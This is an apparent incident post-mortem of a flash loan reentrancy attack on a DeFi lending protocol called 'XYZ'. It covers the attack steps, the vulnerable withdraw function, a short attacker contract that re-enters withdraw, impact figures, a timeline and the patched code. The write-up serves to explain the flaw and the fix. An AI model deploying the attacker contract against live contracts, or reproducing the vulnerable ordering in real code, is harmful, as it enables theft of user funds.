# Flash Loan Reentrancy Attack on DeFi Protocol XYZ

## Overview

On March 15, 2024, DeFi protocol XYZ experienced a sophisticated flash loan reentrancy attack, resulting in a loss of approximately $2.5M in user funds. The attacker exploited a vulnerability in the protocol's lending contract to perform multiple unauthorized withdrawals.

## Attack Details

The attack was executed through a series of carefully orchestrated transactions:

1. The attacker initiated a flash loan of 1000 ETH from Aave
2. Used the borrowed funds to deposit into XYZ's lending pool
3. Exploited a reentrancy vulnerability in the `withdraw()` function
4. Performed multiple withdrawals before the balance was updated
5. Repaid the flash loan and kept the stolen funds

## Technical Analysis

The vulnerability existed in the following smart contract code:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    balances[msg.sender] -= amount;  // State update after external call
}
```

The critical issue was updating the user's balance after the external call, violating the Checks-Effects-Interactions pattern. This allowed the attacker's contract to make recursive calls to `withdraw()` before the balance was updated:

```solidity
contract AttackerContract {
    XYZProtocol public xyz;
    uint256 public count;

    function attack() external {
        // Initial deposit
        xyz.deposit{value: 1 ether}();
        // Start reentrancy
        xyz.withdraw(1 ether);
    }

    receive() external payable {
        if (count < 5) {
            count++;
            xyz.withdraw(1 ether);
        }
    }
}
```

## Impact

The attack had significant consequences:

- $2.5M in user funds stolen
- 1,500 users affected
- Protocol's TVL dropped by 45%
- XYZ token price decreased by 30%

## Timeline

- 14:23 UTC: First suspicious transaction detected
- 14:25 UTC: Attack transactions executed
- 14:30 UTC: Protocol team alerted
- 14:45 UTC: All protocol functions paused
- 15:00 UTC: Initial security assessment completed
- 16:00 UTC: Preliminary post-mortem released

## Mitigation

The protocol team has implemented several measures:

1. Fixed the reentrancy vulnerability by updating state before external calls
2. Added ReentrancyGuard to all sensitive functions
3. Implemented additional security checks
4. Completed a full security audit
5. Enhanced monitoring systems

Updated contract code:

```solidity
contract XYZProtocol is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;  // State update before external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```
